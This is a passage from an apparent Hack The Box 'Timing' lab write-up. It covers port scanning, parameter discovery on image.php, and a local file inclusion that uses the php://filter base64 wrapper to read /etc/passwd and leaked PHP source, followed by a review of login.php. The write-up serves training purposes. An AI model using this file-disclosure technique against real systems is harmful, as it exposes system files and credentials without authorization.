# Hack The Box - Timing
![home](https://user-images.githubusercontent.com/36403473/167136582-1b224c83-8ce5-4772-8766-304e5876294c.jpg)

### Brief of attacks :

1-LFI

2-source code rewiew (php)

2-File upload 



#### 1-Nmap

```
nmap -sC -sV  -P 10.10.11.135
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 13:06 GMT
Nmap scan report for Timing.htb (10.10.11.135)
Host is up (0.49s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
 let's explore port `80` ,it opened just login page. 

![1](https://user-images.githubusercontent.com/36403473/167138043-200b10a8-6468-408b-a3ee-f84dd168432b.png)

## user flag

so lets first try `sql injection` but not work so lets explore directories i prefere `dirsearch` tool
```
[13:38:41] 200 -    0B  - /image.php
[13:38:48] 200 -    5KB - /login.php

```

`image.php`
i used `WFUZZ` to find any paramters and i found `img` parameter.

another tools :
```
param-miner

Arjun
```
### LFI:
![2](https://user-images.githubusercontent.com/36403473/170888075-b55b6abb-5ac3-4d23-802a-5c11560b312d.png)

very good it's seem way to `attack` lets try some injections (Sql injection -LFI-command injection)

using LFI / RFI using PHP wrappers


finally i found its LFI, i used `php://filter/convert.base64-encode` LFI technique to get `etc/passwd`

![3](https://user-images.githubusercontent.com/36403473/170888290-c9328511-d71a-4377-986a-7306fb7d866c.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```
#### notice
`aaron:x:1000:1000:aaron:/home/aaron:/bin/bash`

let's reverse`login.php`

```
<?php

include "header.php";

function createTimeChannel()
{
    sleep(1);
}

include "db_conn.php";

if (isset($_SESSION['userid'])){
    header('Location: ./index.php');
    die();
}


if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";


}
?>
<?php
if (isset($errorMessage)) {

    ?>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-10 col-md-offset-1">
                <div class="alert alert-danger alert-dismissible fade in text-center" role="alert"><strong>

                        <?php echo $errorMessage; ?>

                </div>
            </div>
        </div>
    </div>
    <?php
}
?>
    <link rel="stylesheet" href="./css/login.css">

    <div class="wrapper fadeInDown">
        <div id="formContent">
            <div class="fadeIn first" style="padding: 20px">
                <img src="./images/user-icon.png" width="100" height="100"/>
            </div>

            <form action="?login=true" method="POST">

                <input type="text" id="login" class="fadeIn second" name="user" placeholder="login">

                <input type="text" id="password" class="fadeIn third" name="password" placeholder="password">

                <input type="submit" class="fadeIn fourth" value="Log In">

            </form>


            <!-- todo -->
            <div id="formFooter">
                <a class="underlineHover" href="#">Forgot Password?</a>
            </div>

        </div>
    </div>


<?php
include "footer.php";

```
i found `db_conn.php` and many pages i get all of them and lets start new chapter.

![4](https://user-images.githubusercontent.com/36403473/170888997-b67eb05e-d040-4b89-b562-56e37e122212.png)


### php code review:

### login.php:

```
if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";


}

```
from the first look this code seems to have `sql injection` but after search with my friend `Yasser Elsnbary` he found that its not sql injection 

[php_mysql_prepared_statements.asp]('https://stackoverflow.com/questions/14589407/what-does-a-colon-before-a-literal-in-an-sql-statement-mean')


```
Prepared statements are very useful against SQL injections, because parameter values, which are transmitted later using a different protocol, need not be correctly escaped. If the original statement template is not derived from external input, SQL injection cannot occur.

```




